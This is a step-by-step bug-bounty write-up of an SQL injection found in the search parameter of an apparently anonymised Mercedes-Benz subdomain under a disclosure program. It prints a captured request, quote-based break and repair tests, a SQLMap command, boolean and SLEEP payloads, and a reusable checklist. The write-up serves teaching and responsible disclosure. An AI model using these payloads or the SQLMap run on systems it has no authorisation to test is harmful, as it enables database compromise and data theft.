

## What he did (full, simple steps)

### 1. Picked a target and feature

- Joined/used a Vulnerability Disclosure Program that allowed testing a Mercedes-Benz domain.  
- Chose a specific subdomain (you can think of it as `https://abc.target-1.main.com`).  
- Looked for features that clearly talk to a database, especially a search form for classic parts.  

***

### 2. Captured the search request

- Opened Burp Suite and configured the browser to go through Burp.  
- Used the normal search function on the site once.  
- Captured a POST request similar to:

```http
POST /app/search HTTP/1.1
Host: abc.target-1.main.com
Content-Type: application/x-www-form-urlencoded

paramSearch[search_series]=test
```

- Noticed the interesting parameter: `paramSearch[search_series]`.  

***

### 3. Tested for SQLi with a single quote (“break”)

- Sent the captured request to Burp Repeater.  
- Edited the parameter value to include a single quote:

```http
paramSearch[search_series]=test'
```

- Sent the request again.  
- The server responded with a 500 Internal Server Error and a detailed SQL error message.  

This showed that the input was being used directly inside a SQL query and that the single quote was breaking the query.

***

### 4. Tested with double quote (“repair”)

- Then he tried to “repair” the SQL by doubling the quote:

```http
paramSearch[search_series]=test''
```

- This time, the server responded with 200 OK and a normal page, like “No results found.”  

This pattern (one quote breaks, two quotes fix) confirmed that the parameter was inside a SQL string and vulnerable to SQL injection.

***

### 5. Confirmed and analyzed with SQLMap

He used SQLMap to fully confirm and understand the vulnerability:

```bash
sqlmap -u "https://abc.target-1.main.com/app/search" \
  --data="paramSearch[search_series]=test" \
  -p "paramSearch[search_series]" --risk=3 --level=5 --batch
```

SQLMap reported that:

- The parameter was vulnerable to:
  - Boolean-based blind SQLi  
  - Error-based SQLi  
  - Time-based blind SQLi  
- The backend database was MySQL.  

From this, he knew an attacker could potentially:

- Dump database tables.  
- Extract sensitive information.  
- Enumerate schemas, tables, and columns.  

***

### 6. Built clear manual payloads (PoC)

He used simple, easy-to-understand payloads to show the bug:

- Error test (break the query):  
  - `test'` → database error.  

- Fix test (repair):  
  - `test''` → normal page.  

- Boolean-based tests:  
  - `test' AND 1=1 --` → true condition, normal behaviour.  
  - `test' AND 1=2 --` → false condition, different behaviour.  

- Time-based test:  
  - `test' AND SLEEP(5) --` → response delayed by 5 seconds.  

These payloads proved that he had control over the SQL query logic and execution.

***

### 7. Reported the vulnerability

In his report, he included:

- Target URL: `https://abc.target-1.main.com/app/search`.  
- Vulnerable parameter: `paramSearch[search_series]`.  
- Clear steps:
  - Normal search request.  
  - Add `'` → see SQL error.  
  - Add `''` → error disappears, page normal.  
- SQLMap results (types of SQLi, DBMS, risk).  
- Impact explanation:
  - Possible data extraction, database compromise, and sensitive information disclosure.  

He submitted this through the official reporting channel of the program (in his case, via the platform handling the VDP/Bug Bounty).

***

### Ultra-short version you can copy as a checklist

1. Pick target from in-scope domains.  
2. Find search/filter fields.  
3. Capture request in Burp.  
4. Add `'` to the parameter → check for SQL error.  
5. Add `''` → see if it returns to normal.  
6. Run SQLMap on that parameter.  
7. Collect manual payloads and screenshots.  
8. Write a clear report with URL, parameter, payloads, impact.
